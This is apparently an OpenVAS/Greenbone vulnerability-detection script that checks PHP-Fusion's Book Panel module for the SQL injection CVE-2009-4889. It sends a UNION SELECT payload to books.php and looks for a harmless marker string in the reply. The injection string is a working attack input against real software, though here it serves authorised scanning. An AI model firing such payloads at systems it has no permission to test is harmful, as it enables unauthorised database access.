CPE = "cpe:/a:php-fusion:php-fusion";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100043" );
	script_version( "2020-05-11T07:30:32+0000" );
	script_tag( name: "last_modification", value: "2020-05-11 07:30:32 +0000 (Mon, 11 May 2020)" );
	script_tag( name: "creation_date", value: "2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)" );
	script_bugtraq_id( 34049 );
	script_cve_id( "CVE-2009-4889" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "PHP-Fusion Book Panel Module 'books.php' SQL Injection Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "secpod_php_fusion_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "php-fusion/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34049" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade
  to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "summary", value: "The Book Panel module for PHP-Fusion is prone to an SQL-injection
  vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query." );
	script_tag( name: "impact", value: "Exploiting this issue could allow an attacker to compromise the
  application, access or modify data, or exploit latent vulnerabilities in the underlying database." );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/book_panel/books.php?&bookid=-1+union+select+1,2,0x53514c2d496e6a656374696f6e2d54657374,4,5,6--";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( buf, "SQL-Injection-Test" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

